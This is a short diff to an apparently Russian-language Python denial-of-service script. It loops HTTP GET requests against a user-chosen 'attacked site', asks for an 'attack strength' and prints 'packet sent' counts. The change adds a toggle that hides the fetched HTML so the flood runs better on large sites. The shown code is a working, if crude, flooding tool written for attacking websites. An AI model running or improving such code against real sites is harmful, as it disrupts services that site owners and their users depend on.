@@ -48,7 +48,10 @@ try:
 		while True:
 			try:
 				response = requests.get(f'{site2}').text
-				print(Fore.YELLOW + response)
+				if html == 1:
+					print(Fore.YELLOW + response)
+				else:
+					pass
 				print(Fore.GREEN + f"Пакет послан {i}")
 				print(Style.RESET_ALL)
 				i = i + 1
@@ -58,6 +61,7 @@ try:
 
 	def main():
 		global site2
+		global html
 		system("clear")
 		system("cls")
 		logo()
@@ -68,6 +72,7 @@ try:
 		print(Style.RESET_ALL)
 		op = input("Открыть атакуемый сайт? y/n: ")
 		force = int(input("Введите силу аттаки (Default - 1): "))
+		html = int(input("Отображать код html 1/0? (отключите для больших сайтов): "))
 		if op == "n" or op == "N":
 			print("Атака начинается...")
 			print("Чтобы прервать атаку нажмите ctrl+z")
